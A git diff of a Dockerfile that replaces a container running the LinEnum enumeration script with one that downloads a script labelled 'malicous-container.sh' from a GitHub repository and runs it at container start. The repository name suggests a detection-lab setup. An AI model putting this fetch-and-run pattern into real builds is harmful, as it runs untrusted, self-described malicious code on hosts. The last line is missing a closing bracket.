@@ -1,13 +1,21 @@
-FROM busybox
+# Dockerfile to run and execute the malicous-container.sh script inside a container
 
-# Set working directory
-WORKDIR /tmp
+# Use a base image that includes a shell environment
+FROM ubuntu:20.04
 
-# Download the script from GitHub
-RUN wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+# Set environment variables to minimize interaction during installation
+ENV DEBIAN_FRONTEND=noninteractive
+
+# Update the package list and install necessary packages
+RUN apt-get update && \
+    apt-get install -y curl bash && \
+    rm -rf /var/lib/apt/lists/*
+
+# Copy the malicious script from the repository
+ADD https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/alpha/malicous-container/malicous-container.sh /opt/malicous-container.sh
 
 # Make the script executable
-RUN chmod +x /tmp/LinEnum.sh
+RUN chmod +x /opt/malicous-container.sh
 
-# Run the script when container starts
-CMD ["/tmp/LinEnum"]
+# Run the script
+CMD ["/bin/bash", "/opt/malicous-container.sh"
